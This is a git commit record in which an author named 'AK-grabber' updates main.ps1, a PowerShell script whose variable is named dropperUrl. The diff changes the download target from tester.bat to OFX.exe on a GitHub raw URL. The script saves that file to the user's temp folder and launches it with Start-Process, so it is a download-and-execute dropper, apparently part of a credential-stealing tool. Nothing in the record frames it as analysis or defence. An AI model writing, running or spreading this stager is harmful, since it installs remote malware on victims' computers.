fe583aa0024d0f736146cceea59f051208694b87
AK-grabber <akaltbytheg@gmail.com>
2025-02-22 17:03:35 +0300

    Update main.ps1

--- main.ps1
+++ main.ps1
@@ -1,4 +1,4 @@
-$dropperUrl = "https://raw.githubusercontent.com/AK-grabber/bahofbaoufbgo9uafi/refs/heads/main/tester.bat"
+$dropperUrl = "https://raw.githubusercontent.com/AK-grabber/bahofbaoufbgo9uafi/refs/heads/main/OFX.exe"
 $tempPath = "$env:TEMP\OFX.exe"
 Invoke-WebRequest -Uri $dropperUrl -OutFile $tempPath
 Start-Process -FilePath $tempPath
